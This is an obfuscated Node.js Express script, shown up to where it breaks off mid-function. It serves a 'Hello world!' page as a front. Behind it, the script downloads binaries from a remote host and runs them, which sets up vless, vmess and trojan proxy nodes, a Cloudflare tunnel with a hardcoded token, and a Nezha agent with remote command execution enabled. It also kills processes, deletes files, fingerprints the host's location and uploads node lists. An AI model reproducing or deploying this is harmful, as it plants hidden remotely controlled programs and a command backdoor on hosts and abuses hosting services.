const _0x39f8e6=_0x8da4;(function(_0x84e08d,_0xc774df){const _0xbeb152={_0x3f1c19:0xb0,_0x909547:0xc4,_0x5594b2:0xb9,_0x500024:0xb5,_0x4c11c4:0xd5},_0x4bd25f=_0x8da4,_0x2be943=_0x84e08d();while(!![]){try{const _0x303cf3=-parseInt(_0x4bd25f(_0xbeb152._0x3f1c19))/0x1+parseInt(_0x4bd25f(_0xbeb152._0x909547))/0x2+parseInt(_0x4bd25f(0x97))/0x3+parseInt(_0x4bd25f(0x118))/0x4+parseInt(_0x4bd25f(_0xbeb152._0x5594b2))/0x5+parseInt(_0x4bd25f(0xcb))/0x6*(-parseInt(_0x4bd25f(_0xbeb152._0x500024))/0x7)+parseInt(_0x4bd25f(0xeb))/0x8*(-parseInt(_0x4bd25f(_0xbeb152._0x4c11c4))/0x9);if(_0x303cf3===_0xc774df)break;else _0x2be943['push'](_0x2be943['shift']());}catch(_0x5459fc){_0x2be943['push'](_0x2be943['shift']());}}}(_0x1321,0x57efb));const express=require('express'),app=express(),axios=require(_0x39f8e6(0x13e)),os=require('os'),fs=require('fs'),path=require(_0x39f8e6(0xd6)),{promisify}=require('util'),exec=promisify(require(_0x39f8e6(0xc9))['exec']),{execSync}=require(_0x39f8e6(0xc9)),UPLOAD_URL=process[_0x39f8e6(0xc6)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x39f8e6(0xc6)][_0x39f8e6(0xea)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x39f8e6(0xc6)][_0x39f8e6(0xcf)]||_0x39f8e6(0xbc),SUB_PATH=process[_0x39f8e6(0xc6)][_0x39f8e6(0xdd)]||_0x39f8e6(0x88),PORT=process[_0x39f8e6(0xc6)][_0x39f8e6(0xdb)]||process['env'][_0x39f8e6(0x116)]||0xbb8,UUID=process['env'][_0x39f8e6(0x131)]||'453f7845-c51a-4da5-8705-bdb7c367b66a',NEZHA_SERVER=process[_0x39f8e6(0xc6)][_0x39f8e6(0x92)]||'',NEZHA_PORT=process[_0x39f8e6(0xc6)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x39f8e6(0xc6)][_0x39f8e6(0xbb)]||'',ARGO_DOMAIN=process[_0x39f8e6(0xc6)][_0x39f8e6(0xb8)]||_0x39f8e6(0xee),ARGO_AUTH=process['env'][_0x39f8e6(0x132)]||_0x39f8e6(0x10b),ARGO_PORT=process[_0x39f8e6(0xc6)][_0x39f8e6(0xf3)]||0xcb20,CFIP=process[_0x39f8e6(0xc6)][_0x39f8e6(0xa4)]||_0x39f8e6(0x87),CFPORT=process['env'][_0x39f8e6(0xda)]||0x1bb,NAME=process[_0x39f8e6(0xc6)]['NAME']||_0x39f8e6(0x144);!fs[_0x39f8e6(0x12e)](FILE_PATH)?(fs[_0x39f8e6(0xfc)](FILE_PATH),console[_0x39f8e6(0x96)](FILE_PATH+_0x39f8e6(0x119))):console['log'](FILE_PATH+_0x39f8e6(0x8f));function generateRandomName(){const _0x3ef971={_0xc5b0f1:0x103,_0x14bc72:0x12d,_0x15f8aa:0x128},_0x10e7f0=_0x39f8e6,_0x578172=_0x10e7f0(_0x3ef971._0xc5b0f1);let _0x34a13d='';for(let _0xfc9b25=0x0;_0xfc9b25<0x6;_0xfc9b25++){_0x34a13d+=_0x578172['charAt'](Math[_0x10e7f0(_0x3ef971._0x14bc72)](Math[_0x10e7f0(_0x3ef971._0x15f8aa)]()*_0x578172[_0x10e7f0(0xa3)]));}return _0x34a13d;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x39f8e6(0xe5)](FILE_PATH,npmName),phpPath=path[_0x39f8e6(0xe5)](FILE_PATH,phpName),webPath=path[_0x39f8e6(0xe5)](FILE_PATH,webName),botPath=path[_0x39f8e6(0xe5)](FILE_PATH,botName),subPath=path[_0x39f8e6(0xe5)](FILE_PATH,'sub.txt'),listPath=path[_0x39f8e6(0xe5)](FILE_PATH,_0x39f8e6(0x123)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,'config.json');function _0x8da4(_0x46555f,_0x1d0389){const _0x1321f8=_0x1321();return _0x8da4=function(_0x8da42d,_0x51859e){_0x8da42d=_0x8da42d-0x82;let _0x45d7f8=_0x1321f8[_0x8da42d];return _0x45d7f8;},_0x8da4(_0x46555f,_0x1d0389);}function deleteNodes(){const _0x44dcfe={_0x28570a:0x130,_0x476c86:0x9f,_0xe71e38:0xa3,_0x3d10ff:0x10c,_0x492723:0xad,_0xc7f015:0x136},_0x2db5cb=_0x39f8e6;try{if(!UPLOAD_URL)return;if(!fs[_0x2db5cb(0x12e)](subPath))return;let _0x1aa469;try{_0x1aa469=fs[_0x2db5cb(0xc7)](subPath,'utf-8');}catch{return null;}const _0x542330=Buffer[_0x2db5cb(_0x44dcfe._0x28570a)](_0x1aa469,_0x2db5cb(0xf0))['toString'](_0x2db5cb(0x127)),_0x5ede37=_0x542330[_0x2db5cb(0x137)]('\x0a')[_0x2db5cb(_0x44dcfe._0x476c86)](_0x7b31c9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2db5cb(0xc2)](_0x7b31c9));if(_0x5ede37[_0x2db5cb(_0x44dcfe._0xe71e38)]===0x0)return;return axios[_0x2db5cb(_0x44dcfe._0x3d10ff)](UPLOAD_URL+_0x2db5cb(0x105),JSON[_0x2db5cb(_0x44dcfe._0x492723)]({'nodes':_0x5ede37}),{'headers':{'Content-Type':_0x2db5cb(_0x44dcfe._0xc7f015)}})['catch'](_0x31859f=>{return null;}),null;}catch(_0x2dc345){return null;}}function cleanupOldFiles(){const _0x582963={_0x2eb01b:0x106,_0x35ef72:0x135},_0x39c0ff=_0x39f8e6;try{const _0x2258e0=fs['readdirSync'](FILE_PATH);_0x2258e0[_0x39c0ff(0xdf)](_0xf9d1ea=>{const _0x59c45b=_0x39c0ff,_0xcaeab1=path['join'](FILE_PATH,_0xf9d1ea);try{const _0x15d8b8=fs[_0x59c45b(_0x582963._0x2eb01b)](_0xcaeab1);_0x15d8b8[_0x59c45b(0x142)]()&&fs[_0x59c45b(_0x582963._0x35ef72)](_0xcaeab1);}catch(_0x19f7c1){}});}catch(_0x2b18e4){}}app[_0x39f8e6(0x11a)]('/',function(_0x59179b,_0x41bfe5){const _0x20b0ff={_0x3441b6:0x13c},_0x2916d2=_0x39f8e6;_0x41bfe5['send'](_0x2916d2(_0x20b0ff._0x3441b6));});function _0x1321(){const _0xb478e2=['ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','/config.json\x20>/dev/null\x202>&1\x20&','/sub.txt\x20saved\x20successfully','utf-8','random','/trojan-argo','amd','arm','set','floor','existsSync','Error\x20downloading\x20files:','from','UUID','ARGO_AUTH','/tunnel.yml\x20run','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','unlinkSync','application/json','split','Unknown','Content-Type','&path=%2Fvless-argo%3Fed%3D2560#','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Hello\x20world!','includes','axios','\x0a\x0avmess://','http','\x0a\x20\x20\x20\x20','isFile','/vmess-argo?ed=2560','railway','catch','https://amd64.ssss.nyc.mn/web','xtls-rprx-vision','&fp=firefox&type=ws&host=','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','TunnelSecret','Unhandled\x20error\x20in\x20startserver:','cdns.doon.eu.org','sub','unshift','Nodes\x20uploaded\x20successfully','text/plain;\x20charset=utf-8','web\x20running\x20error:\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0a\x0atrojan://','\x20already\x20exists','taskkill\x20/f\x20/im\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','NEZHA_SERVER','freedom','127.0.0.1','clear','log','946479fRahoR','tls','has','\x0avless://','2053','/vless-argo','Subscription\x20uploaded\x20successfully','boot.log','filter','Empowerment\x20failed\x20for\x20','Empowerment\x20success\x20for\x20','trojan','length','CFIP','config.yaml','8443','Add\x20automatic\x20access\x20task\x20faild:\x20','success','/dev/null','?security=tls&sni=','firefox','message','stringify','substring','writeFileSync','617314saDKsw','\x20-c\x20\x22','all','pop','false','14ZSlHGR','ArgoDomain:','\x0a\x20\x20credentials-file:\x20','ARGO_DOMAIN','527335XUZqPz','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','NEZHA_KEY','./tmp','https+local://8.8.8.8/dns-query','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','push','org','test','\x22\x20>\x20/dev/null\x202>&1','1400034qSOSDU','platform','env','readFileSync','https://ipapi.co/json/','child_process','quic','997116zraKpY','https://arm64.ssss.nyc.mn/bot','tunnel.yml','fileUrl','FILE_PATH','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','vmess','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','https://amd64.ssss.nyc.mn/bot','\x20failed:\x20','28287gGSjYZ','path','response','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/vmess-argo','CFPORT','SERVER_PORT','pkill\x20-f\x20\x22[','SUB_PATH','win32','forEach','\x20is\x20running','direct','2087','npm\x20running\x20error:\x20','fileName','join','map','pipe','php\x20running\x20error:\x20','listen','PROJECT_URL','32lcSBqq','close','https://amd64.ssss.nyc.mn/v1','kers.sde.indevs.in','\x20>/dev/null\x202>&1\x20&','base64','Download\x20','automatic\x20access\x20task\x20added\x20successfully','ARGO_PORT','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','unlink','blackhole','charAt','Error\x20executing\x20command:\x20','nohup\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/api/add-nodes','mkdirSync','none','country_code','error','rm\x20-rf\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','match','abcdefghijklmnopqrstuvwxyz','\x20>/dev/null\x202>&1','/api/delete-nodes','statSync','finish','arch','2083','tunnel.json','eyJhIjoiYzNiZDk0OWFiNzU2ODZlNGI4ZDIwNWIyNjhhYmVmMDUiLCJ0IjoiOGNmNWYzMmItNThlNi00MzNjLWIxNGEtODgyOWM1MzkwZGIxIiwicyI6Ik5ESTVaRGsyTmpBdE5ESTFNaTAwWVROaExUa3pZMlV0T0RCbE1EUmtZV0ZtWmpSayJ9','post','arm64','countryCode','vless','\x20-c\x20','chmod','true','.exe\x20>\x20nul\x202>&1','\x0aclient_secret:\x20','2096','PORT','status','805872NHvdZU','\x20is\x20created','get','/api/add-subscriptions','toString','then','tcp','\x0a\x20\x20tunnel:\x20','http://ip-api.com/json/','&path=%2Ftrojan-argo%3Fed%3D2560#','data','list.txt'];_0x1321=function(){return _0xb478e2;};return _0x1321();}async function generateConfig(){const _0x1872b9={_0x5a5ce5:0xa9,_0x231a26:0xfd,_0x286c5a:0x82,_0x44a2d6:0xfd,_0x2b74d4:0x11e,_0x551150:0x10f,_0x33358e:0x10f,_0x594d7c:0x9c,_0x1deb96:0x98,_0x431f76:0x94,_0xf436bc:0xd1,_0x465e0e:0x140,_0x3f187c:0xa2,_0x56ba11:0x129,_0x155b10:0x98,_0x2ac8e6:0xca,_0x349d8e:0x93,_0x43796b:0xe1,_0xacca76:0xe5},_0x2d81fe=_0x39f8e6,_0x4ec58d={'log':{'access':_0x2d81fe(_0x1872b9._0x5a5ce5),'error':'/dev/null','loglevel':_0x2d81fe(_0x1872b9._0x231a26)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2d81fe(0x10f),'settings':{'clients':[{'id':UUID,'flow':_0x2d81fe(_0x1872b9._0x286c5a)}],'decryption':_0x2d81fe(_0x1872b9._0x44a2d6),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x2d81fe(0xd9),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x2d81fe(_0x1872b9._0x2b74d4)}},{'port':0xbb9,'listen':_0x2d81fe(0x94),'protocol':_0x2d81fe(_0x1872b9._0x551150),'settings':{'clients':[{'id':UUID}],'decryption':_0x2d81fe(_0x1872b9._0x44a2d6)},'streamSettings':{'network':_0x2d81fe(0x11e),'security':_0x2d81fe(_0x1872b9._0x231a26)}},{'port':0xbba,'listen':_0x2d81fe(0x94),'protocol':_0x2d81fe(_0x1872b9._0x33358e),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2d81fe(0xfd)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x2d81fe(_0x1872b9._0x594d7c)}},'sniffing':{'enabled':!![],'destOverride':[_0x2d81fe(0x140),_0x2d81fe(_0x1872b9._0x1deb96),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2d81fe(_0x1872b9._0x431f76),'protocol':_0x2d81fe(_0x1872b9._0xf436bc),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2d81fe(_0x1872b9._0x465e0e),_0x2d81fe(0x98),_0x2d81fe(0xca)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x2d81fe(_0x1872b9._0x3f187c),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x2d81fe(_0x1872b9._0x56ba11)}},'sniffing':{'enabled':!![],'destOverride':[_0x2d81fe(_0x1872b9._0x465e0e),_0x2d81fe(_0x1872b9._0x155b10),_0x2d81fe(_0x1872b9._0x2ac8e6)],'metadataOnly':![]}}],'dns':{'servers':[_0x2d81fe(0xbd)]},'outbounds':[{'protocol':_0x2d81fe(_0x1872b9._0x349d8e),'tag':_0x2d81fe(_0x1872b9._0x43796b)},{'protocol':_0x2d81fe(0xf6),'tag':'block'}]};fs[_0x2d81fe(0xaf)](path[_0x2d81fe(_0x1872b9._0xacca76)](FILE_PATH,'config.json'),JSON[_0x2d81fe(0xad)](_0x4ec58d,null,0x2));}function getSystemArchitecture(){const _0x36371a={_0x268af9:0x108,_0x1b486a:0x12b,_0x45c6a3:0x10d,_0x5ccc5c:0x12a},_0x43e4bb=_0x39f8e6,_0x28de91=os[_0x43e4bb(_0x36371a._0x268af9)]();return _0x28de91===_0x43e4bb(_0x36371a._0x1b486a)||_0x28de91===_0x43e4bb(_0x36371a._0x45c6a3)||_0x28de91==='aarch64'?'arm':_0x43e4bb(_0x36371a._0x5ccc5c);}function downloadFile(_0x16cf41,_0x29b6af,_0x53c2fd){const _0x646fda={_0x3f699e:0x12e,_0x3ae3ea:0x11d,_0x1791ca:0x145},_0x5e5c05={_0x2fa38f:0xf1,_0x525118:0xff},_0x439e38={_0x596d9d:0xe7,_0x5d6b06:0x107,_0x30105a:0xff},_0x3ed55c={_0x23247d:0xf5,_0x12a699:0xd4,_0x1d5dfa:0xac,_0x58e845:0xff},_0x4a4953=_0x39f8e6,_0x39a0db=_0x16cf41;!fs[_0x4a4953(_0x646fda._0x3f699e)](FILE_PATH)&&fs[_0x4a4953(0xfc)](FILE_PATH,{'recursive':!![]});const _0x523151=fs['createWriteStream'](_0x39a0db);axios({'method':_0x4a4953(0x11a),'url':_0x29b6af,'responseType':'stream'})[_0x4a4953(_0x646fda._0x3ae3ea)](_0x2ac0d2=>{const _0x586643={_0x3d74e3:0xec,_0x2f997e:0x96},_0xd8585c=_0x4a4953;_0x2ac0d2['data'][_0xd8585c(_0x439e38._0x596d9d)](_0x523151),_0x523151['on'](_0xd8585c(_0x439e38._0x5d6b06),()=>{const _0x5a446d=_0xd8585c;_0x523151[_0x5a446d(_0x586643._0x3d74e3)](),console[_0x5a446d(_0x586643._0x2f997e)]('Download\x20'+path['basename'](_0x39a0db)+'\x20successfully'),_0x53c2fd(null,_0x39a0db);}),_0x523151['on'](_0xd8585c(_0x439e38._0x30105a),_0x96a8a8=>{const _0x4beed9=_0xd8585c;fs[_0x4beed9(_0x3ed55c._0x23247d)](_0x39a0db,()=>{});const _0x47d92c=_0x4beed9(0xf1)+path['basename'](_0x39a0db)+_0x4beed9(_0x3ed55c._0x12a699)+_0x96a8a8[_0x4beed9(_0x3ed55c._0x1d5dfa)];console[_0x4beed9(_0x3ed55c._0x58e845)](_0x47d92c),_0x53c2fd(_0x47d92c);});})[_0x4a4953(_0x646fda._0x1791ca)](_0x3cd00b=>{const _0x56cf73=_0x4a4953,_0x5495a3=_0x56cf73(_0x5e5c05._0x2fa38f)+path['basename'](_0x39a0db)+_0x56cf73(0xd4)+_0x3cd00b[_0x56cf73(0xac)];console[_0x56cf73(_0x5e5c05._0x525118)](_0x5495a3),_0x53c2fd(_0x5495a3);});}async function downloadFilesAndRun(){const _0x3639b6={_0x16b214:0xa3,_0x36d532:0xfa,_0x503eaa:0xb2,_0x2fe6cf:0x13d,_0x1bffe0:0xb3,_0x24b0a3:0x115,_0x250009:0xe2,_0x3357c1:0x109,_0x957281:0x9b,_0x3ca210:0x112,_0x4a9b10:0xbe,_0x5e04ef:0xaf,_0x2ffe58:0xa5,_0x1f1c2d:0xb1,_0x23817c:0x101,_0x1b33e2:0x96,_0x4a4416:0xe8,_0x54f351:0xa6,_0x4b5d2a:0x96,_0x38e11c:0xe0,_0x3ae2fe:0x96,_0x1ee4e7:0x110,_0x4a70ac:0x8c,_0x550117:0xd2,_0x56b913:0x102,_0xc219de:0x133,_0x4dc275:0x134,_0x360b8b:0xff},_0x495138={_0x3c0345:0xdf},_0x3276fb=_0x39f8e6,_0x32dd6b=getSystemArchitecture(),_0x58fe8e=getFilesForArchitecture(_0x32dd6b);if(_0x58fe8e[_0x3276fb(_0x3639b6._0x16b214)]===0x0){console['log'](_0x3276fb(_0x3639b6._0x36d532));return;}const _0x3139fc=_0x58fe8e[_0x3276fb(0xe6)](_0x277416=>{return new Promise((_0x29d7e1,_0x307395)=>{const _0x20ff47=_0x8da4;downloadFile(_0x277416[_0x20ff47(0xe4)],_0x277416[_0x20ff47(0xce)],(_0x134073,_0x3b2388)=>{_0x134073?_0x307395(_0x134073):_0x29d7e1(_0x3b2388);});});});try{await Promise[_0x3276fb(_0x3639b6._0x503eaa)](_0x3139fc);}catch(_0x1601c0){console[_0x3276fb(0xff)](_0x3276fb(0x12f),_0x1601c0);return;}function _0x2af3c0(_0x3b6b7c){const _0x48169e=_0x3276fb,_0x23c001=0x1fd;_0x3b6b7c[_0x48169e(_0x495138._0x3c0345)](_0x460112=>{const _0x1e4538={_0x3c869a:0xff,_0xa3d8ce:0x96},_0x4527f1=_0x48169e;fs[_0x4527f1(0x12e)](_0x460112)&&fs[_0x4527f1(0x111)](_0x460112,_0x23c001,_0x508114=>{const _0xea9ec5=_0x4527f1;_0x508114?console[_0xea9ec5(_0x1e4538._0x3c869a)](_0xea9ec5(0xa0)+_0x460112+':\x20'+_0x508114):console[_0xea9ec5(_0x1e4538._0xa3d8ce)](_0xea9ec5(0xa1)+_0x460112+':\x20'+_0x23c001['toString'](0x8));});});}const _0x2444bc=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2af3c0(_0x2444bc);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4197fa=NEZHA_SERVER[_0x3276fb(_0x3639b6._0x2fe6cf)](':')?NEZHA_SERVER['split'](':')[_0x3276fb(_0x3639b6._0x1bffe0)]():'',_0x4e8e7f=new Set(['443',_0x3276fb(0xa6),_0x3276fb(_0x3639b6._0x24b0a3),_0x3276fb(_0x3639b6._0x250009),_0x3276fb(_0x3639b6._0x3357c1),_0x3276fb(_0x3639b6._0x957281)]),_0x3266c9=_0x4e8e7f[_0x3276fb(0x99)](_0x4197fa)?_0x3276fb(_0x3639b6._0x3ca210):_0x3276fb(0xb4),_0x51c87b=_0x3276fb(0x114)+NEZHA_KEY+_0x3276fb(_0x3639b6._0x4a9b10)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x3266c9+_0x3276fb(0xbf)+UUID;fs[_0x3276fb(_0x3639b6._0x5e04ef)](path['join'](FILE_PATH,_0x3276fb(_0x3639b6._0x2ffe58)),_0x51c87b);const _0x515f80='nohup\x20'+phpPath+_0x3276fb(_0x3639b6._0x1f1c2d)+FILE_PATH+_0x3276fb(_0x3639b6._0x23817c);try{await exec(_0x515f80),console[_0x3276fb(_0x3639b6._0x1b33e2)](phpName+_0x3276fb(0xe0)),await new Promise(_0x36fa8f=>setTimeout(_0x36fa8f,0x3e8));}catch(_0x4af21e){console[_0x3276fb(0xff)](_0x3276fb(_0x3639b6._0x4a4416)+_0x4af21e);}}else{let _0x5efa15='';const _0x4a9561=['443',_0x3276fb(_0x3639b6._0x54f351),'2096','2087','2083',_0x3276fb(0x9b)];_0x4a9561[_0x3276fb(0x13d)](NEZHA_PORT)&&(_0x5efa15='--tls');const _0x14b338='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5efa15+_0x3276fb(0x84);try{await exec(_0x14b338),console[_0x3276fb(_0x3639b6._0x4b5d2a)](npmName+_0x3276fb(_0x3639b6._0x38e11c)),await new Promise(_0x58d0b4=>setTimeout(_0x58d0b4,0x3e8));}catch(_0x241251){console['error'](_0x3276fb(0xe3)+_0x241251);}}}else console[_0x3276fb(_0x3639b6._0x3ae2fe)](_0x3276fb(0x91));const _0xc0b1ca=_0x3276fb(0xf9)+webPath+_0x3276fb(_0x3639b6._0x1ee4e7)+FILE_PATH+_0x3276fb(0x125);try{await exec(_0xc0b1ca),console[_0x3276fb(_0x3639b6._0x4b5d2a)](webName+_0x3276fb(0xe0)),await new Promise(_0x1afd3a=>setTimeout(_0x1afd3a,0x3e8));}catch(_0x1f7ff2){console[_0x3276fb(0xff)](_0x3276fb(_0x3639b6._0x4a70ac)+_0x1f7ff2);}if(fs['existsSync'](botPath)){let _0x26a8f5;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x26a8f5=_0x3276fb(_0x3639b6._0x550117)+ARGO_AUTH;else ARGO_AUTH[_0x3276fb(_0x3639b6._0x56b913)](/TunnelSecret/)?_0x26a8f5=_0x3276fb(0xf4)+FILE_PATH+_0x3276fb(_0x3639b6._0xc219de):_0x26a8f5=_0x3276fb(_0x3639b6._0x4dc275)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x26a8f5+_0x3276fb(0xef)),console[_0x3276fb(0x96)](botName+_0x3276fb(0xe0)),await new Promise(_0x27e53a=>setTimeout(_0x27e53a,0x7d0));}catch(_0x3a7dd6){console[_0x3276fb(_0x3639b6._0x360b8b)](_0x3276fb(0xf8)+_0x3a7dd6);}}await new Promise(_0x4759f6=>setTimeout(_0x4759f6,0x1388));}function getFilesForArchitecture(_0x75101f){const _0x57097a={_0x562439:0xcc,_0x52d923:0x146,_0x19a9ad:0x12b,_0x5f22b1:0xed,_0xb30195:0x89},_0x10163e=_0x39f8e6;let _0x17f2ad;_0x75101f===_0x10163e(0x12b)?_0x17f2ad=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x10163e(_0x57097a._0x562439)}]:_0x17f2ad=[{'fileName':webPath,'fileUrl':_0x10163e(_0x57097a._0x52d923)},{'fileName':botPath,'fileUrl':_0x10163e(0xd3)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3c63eb=_0x75101f==='arm'?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x17f2ad['unshift']({'fileName':npmPath,'fileUrl':_0x3c63eb});}else{const _0x15b45c=_0x75101f===_0x10163e(_0x57097a._0x19a9ad)?'https://arm64.ssss.nyc.mn/v1':_0x10163e(_0x57097a._0x5f22b1);_0x17f2ad[_0x10163e(_0x57097a._0xb30195)]({'fileName':phpPath,'fileUrl':_0x15b45c});}}return _0x17f2ad;}function argoType(){const _0x4be5e5={_0x64a4c8:0x96,_0x300f81:0xaf,_0x475f00:0xe5,_0x4a86ff:0x11f,_0x349663:0x10a,_0x4a8f13:0xaf,_0x2b4953:0x96},_0x3e27f3=_0x39f8e6;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3e27f3(_0x4be5e5._0x64a4c8)](_0x3e27f3(0xd8));return;}if(ARGO_AUTH[_0x3e27f3(0x13d)](_0x3e27f3(0x85))){fs[_0x3e27f3(_0x4be5e5._0x300f81)](path[_0x3e27f3(_0x4be5e5._0x475f00)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0xffdcbd=_0x3e27f3(_0x4be5e5._0x4a86ff)+ARGO_AUTH[_0x3e27f3(0x137)]('\x22')[0xb]+_0x3e27f3(0xb7)+path['join'](FILE_PATH,_0x3e27f3(_0x4be5e5._0x349663))+_0x3e27f3(0x8d)+ARGO_DOMAIN+_0x3e27f3(0xba)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x3e27f3(_0x4be5e5._0x4a8f13)](path[_0x3e27f3(0xe5)](FILE_PATH,_0x3e27f3(0xcd)),_0xffdcbd);}else console[_0x3e27f3(_0x4be5e5._0x2b4953)](_0x3e27f3(0x124));}async function extractDomains(){const _0x319e09={_0x4e0a47:0x96,_0xfacfad:0xf9,_0x4f187d:0xef,_0x540a17:0x96,_0x2001bd:0xff},_0x373ce4={_0x479c3a:0x11a,_0x55b108:0x122,_0x2088a7:0xfe,_0x118bce:0x122,_0x4f3c5b:0x117,_0x53f6f9:0xa8,_0x5e7e67:0x10e,_0x2c8c61:0x122,_0x453ecd:0x122},_0x288530={_0x14495d:0xde,_0x459e63:0x90,_0x59ac72:0xf7,_0x3d7cb0:0xc3},_0x5be652={_0x51be2f:0x102},_0xe48594=_0x39f8e6;let _0x39d790;if(ARGO_AUTH&&ARGO_DOMAIN)_0x39d790=ARGO_DOMAIN,console[_0xe48594(0x96)]('ARGO_DOMAIN:',_0x39d790),await _0x36503e(_0x39d790);else try{const _0x54b859=fs[_0xe48594(0xc7)](path['join'](FILE_PATH,_0xe48594(0x9e)),'utf-8'),_0x58c08b=_0x54b859[_0xe48594(0x137)]('\x0a'),_0x2c06bf=[];_0x58c08b[_0xe48594(0xdf)](_0x3c9da5=>{const _0x1b4663=_0xe48594,_0x42d882=_0x3c9da5[_0x1b4663(_0x5be652._0x51be2f)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x42d882){const _0xa43232=_0x42d882[0x1];_0x2c06bf['push'](_0xa43232);}});if(_0x2c06bf['length']>0x0)_0x39d790=_0x2c06bf[0x0],console['log'](_0xe48594(0xb6),_0x39d790),await _0x36503e(_0x39d790);else{console[_0xe48594(_0x319e09._0x4e0a47)](_0xe48594(0x13b)),fs[_0xe48594(0x135)](path[_0xe48594(0xe5)](FILE_PATH,'boot.log'));async function _0x433e7a(){const _0x21af20=_0xe48594;try{process['platform']===_0x21af20(_0x288530._0x14495d)?await exec(_0x21af20(_0x288530._0x459e63)+botName+_0x21af20(0x113)):await exec(_0x21af20(0xdc)+botName[_0x21af20(_0x288530._0x59ac72)](0x0)+']'+botName[_0x21af20(0xae)](0x1)+_0x21af20(_0x288530._0x3d7cb0));}catch(_0x26bcfd){}}_0x433e7a(),await new Promise(_0x4a0d54=>setTimeout(_0x4a0d54,0xbb8));const _0x8670d='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0xe48594(_0x319e09._0xfacfad)+botPath+'\x20'+_0x8670d+_0xe48594(_0x319e09._0x4f187d)),console[_0xe48594(_0x319e09._0x540a17)](botName+'\x20is\x20running'),await new Promise(_0x470a66=>setTimeout(_0x470a66,0xbb8)),await extractDomains();}catch(_0x1061f9){console[_0xe48594(_0x319e09._0x2001bd)](_0xe48594(0xf8)+_0x1061f9);}}}catch(_0x2429cc){console[_0xe48594(0xff)]('Error\x20reading\x20boot.log:',_0x2429cc);}async function _0x1e8237(){const _0x3dfe2f=_0xe48594;try{const _0x2cb644=await axios[_0x3dfe2f(_0x373ce4._0x479c3a)](_0x3dfe2f(0xc8),{'timeout':0xbb8});if(_0x2cb644['data']&&_0x2cb644[_0x3dfe2f(0x122)]['country_code']&&_0x2cb644['data'][_0x3dfe2f(0xc1)])return _0x2cb644[_0x3dfe2f(_0x373ce4._0x55b108)][_0x3dfe2f(_0x373ce4._0x2088a7)]+'_'+_0x2cb644[_0x3dfe2f(0x122)]['org'];}catch(_0x5a1d85){try{const _0x32e3dd=await 